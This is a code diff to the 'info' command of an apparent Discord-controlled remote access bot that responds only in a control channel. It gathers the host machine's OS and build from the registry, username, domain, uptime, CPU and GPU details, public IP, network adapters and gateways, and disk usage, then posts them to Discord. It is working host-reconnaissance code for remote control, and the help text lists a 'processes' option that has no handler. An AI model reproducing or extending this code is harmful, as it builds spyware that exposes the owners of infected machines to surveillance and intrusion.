@@ -1810,57 +1810,199 @@ async def info(ctx, category=None):
     if ctx.channel != ctrl_channel:
         return
     
+    categories = ["system", "hardware", "network", "storage"]
+
     if not category:
-        await ctx.send("Please specify category: system, hardware, or network")
+        await ctx.send(f"""**Info Commands:**
+- `{command_pref}info system` - Display OS and system info
+- `{command_pref}info hardware` - Show CPU, RAM, and hardware info
+- `{command_pref}info network` - Network and IP info
+- `{command_pref}info processes` - Running processes info
+- `{command_pref}info storage` - Disk usage and storage info
+""")
         return
     
-    if category.lower() == "system":
-        info = f"""
-**System Information:**
-OS: {platform.system()} {platform.version()}
-Platform: {platform.platform()}
-Machine: {platform.machine()}
-Processor: {platform.processor()}
-Username: {getpass.getuser()}
-Hostname: {socket.gethostname()}
-"""
-        await ctx.send(info)
+    category = category.lower()
     
-    elif category.lower() == "hardware":
-        cpu_count = psutil.cpu_count()
-        cpu_usage = psutil.cpu_percent(interval=1)
+    if category == "system":
+        os_name = platform.system()
+        os_version = platform.version()
+        build_number = "Unknown"
+        
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
+                try:
+                    os_name = winreg.QueryValueEx(key, "ProductName")[0]
+                except FileNotFoundError:
+                    pass
+                
+                try:
+                    os_version = winreg.QueryValueEx(key, "DisplayVersion")[0]
+                except FileNotFoundError:
+                    try:
+                        os_version = winreg.QueryValueEx(key, "ReleaseId")[0]
+                    except FileNotFoundError:
+                        pass
+                
+                try:
+                    build_number = winreg.QueryValueEx(key, "CurrentBuild")[0]
+                except FileNotFoundError:
+                    pass
+                    
+        except Exception as e:
+            print(f"Registry access failed: {e}")
+            
+        try:
+            computer_name = os.environ.get('COMPUTERNAME', socket.gethostname())
+        except:
+            computer_name = "Unknown"
+            
+        try:
+            username = getpass.getuser()
+        except:
+            username = "Unknown"
+            
+        try:
+            domain = os.environ.get('USERDOMAIN', 'WORKGROUP')
+        except:
+            domain = "Unknown"
+            
+        try:
+            boot_time = datetime.fromtimestamp(psutil.boot_time())
+            uptime = datetime.now() - boot_time
+            boot_time_str = boot_time.strftime('%Y-%m-%d %H:%M:%S')
+            uptime_str = str(uptime).split('.')[0]
+        except Exception as e:
+            boot_time_str = "Unknown"
+            uptime_str = "Unknown"
+            print(f"Boot time calculation failed: {e}")
+
+        try:
+            python_version = platform.python_version()
+        except:
+            python_version = "Unknown"
+            
+        try:
+            architecture = platform.architecture()[0]
+        except:
+            architecture = "Unknown"
+        
+        info = f"""**System Information:**
+- OS Name: ``{os_name}``
+- OS Version: ``{os_version}``
+- Build Number: ``{build_number}``
+- Architecture: ``{architecture}``
+- Computer Name: ``{computer_name}``
+- Username: ``{username}``
+- Domain: ``{domain}``
+- Boot Time: ``{boot_time_str}``
+- Uptime: ``{uptime_str}``
+"""
+        
+        try:
+            await ctx.send(info)
+        except Exception as e:
+            await ctx.send(f"Error sending system info: {str(e)}")
+    
+    elif category == "hardware":
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0") as key:
+                cpu_name = winreg.QueryValueEx(key, "ProcessorNameString")[0]
+        except:
+            cpu_name = platform.processor()
+        
         memory = psutil.virtual_memory()
-        disk = psutil.disk_usage('/')
+        cpu_cores_physical = psutil.cpu_count(logical=False)
+        cpu_cores_logical = psutil.cpu_count(logical=True)
         
-        info = f"""
-**Hardware Information:**
-CPU Cores: {cpu_count}
-CPU Usage: {cpu_usage}%
-Total RAM: {memory.total / (1024**3):.2f} GB
-Used RAM: {memory.used / (1024**3):.2f} GB ({memory.percent}%)
-Total Disk: {disk.total / (1024**3):.2f} GB
-Used Disk: {disk.used / (1024**3):.2f} GB ({disk.percent}%)
+        gpu_info = "Couldn't find GPU, maybe the computer is running windows 11?"
+        try:
+            result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
+                                  capture_output=True, text=True, shell=True)
+            if result.returncode == 0:
+                lines = result.stdout.strip().split('\n')
+                gpu_names = [line.strip() for line in lines if line.strip() and 'Name' not in line and 'Microsoft' not in line]
+                if gpu_names:
+                    gpu_info = gpu_names[0]
+        except:
+            pass
+        
+        info = f"""**Hardware Information:**
+- CPU Name: {cpu_name}
+- CPU Cores: {cpu_cores_physical} physical, {cpu_cores_logical} logical
+- Total RAM: {memory.total / (1024**3):.2f} GB
+- Available RAM: {memory.available / (1024**3):.2f} GB
+- RAM Usage: {memory.percent}%
+- GPU: {gpu_info}
 """
         await ctx.send(info)
     
-    elif category.lower() == "network":
+    elif category == "network":
+        try:
+            public_ip = requests.get('https://api.ipify.org', timeout=5).text
+        except:
+            public_ip = "Unable to retrieve"
+        
         hostname = socket.gethostname()
-        ip_address = socket.gethostbyname(hostname)
         
-        net_info = "**Network Interfaces:**\n"
-        net_if_addrs = psutil.net_if_addrs()
-        for interface, addrs in net_if_addrs.items():
-            net_info += f"Interface: {interface}\n"
-            for addr in addrs:
-                if addr.family == socket.AF_INET:
-                    net_info += f"  IPv4: {addr.address}\n"
-                elif addr.family == socket.AF_INET6:
-                    net_info += f"  IPv6: {addr.address}\n"
+        net_info = ""
+        try:
+            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, shell=True)
+            if result.returncode == 0:
+                lines = result.stdout.split('\n')
+                current_adapter = ""
+                for line in lines:
+                    line = line.strip()
+                    if "adapter" in line.lower() and ":" in line:
+                        current_adapter = line.split(':')[0].replace('Ethernet adapter', '').replace('Wireless LAN adapter', '').strip()
+                        if current_adapter and "Loopback" not in current_adapter:
+                            net_info += f"- {current_adapter}:\n"
+                    elif "IPv4 Address" in line and current_adapter:
+                        ip = line.split(':')[1].strip().replace('(Preferred)', '')
+                        net_info += f"  - IPv4: {ip}\n"
+                    elif "Default Gateway" in line and current_adapter and ":" in line:
+                        gateway = line.split(':')[1].strip()
+                        if gateway:
+                            net_info += f"  - Gateway: {gateway}\n"
+        except:
+            net_info = "- Unable to retrieve adapter details\n"
         
-        await ctx.send(f"**Hostname:** {hostname}\n**Local IP:** {ip_address}\n\n{net_info}")
+        info = f"""**Network Information:**
+- Computer Name: ``{hostname}``
+- Public IP: ``{public_ip}``
+- Network Adapters:
+``{net_info}``"""
+        await ctx.send(info)
+        
+    
+    elif category == "storage":
+        disk_partitions = psutil.disk_partitions()
+        
+        disk_info = ""
+        for partition in disk_partitions:
+            if partition.fstype and 'cdrom' not in partition.opts.lower():
+                try:
+                    disk_usage = psutil.disk_usage(partition.mountpoint)
+                    total_gb = disk_usage.total / (1024**3)
+                    free_gb = disk_usage.free / (1024**3)
+                    used_gb = disk_usage.used / (1024**3)
+                    used_percent = (used_gb / total_gb) * 100
+                    
+                    disk_info += f"- Drive {partition.device}:\n"
+                    disk_info += f"  - File System: {partition.fstype}\n"
+                    disk_info += f"  - Total: {total_gb:.2f} GB\n"
+                    disk_info += f"  - Used: {used_gb:.2f} GB ({used_percent:.1f}%)\n"
+                    disk_info += f"  - Free: {free_gb:.2f} GB\n"
+                except PermissionError:
+                    disk_info += f"- Drive {partition.device}: Permission denied\n"
+        
+        info = f"""**Storage Information:**
+{disk_info}"""
+        await ctx.send(info)
     
     else:
-        await ctx.send("Invalid category. Use system, hardware, or network.")
+        await ctx.send(f"Invalid category. Available: {', '.join(categories)}")
 
 # Voice channel command
 @bot.command()
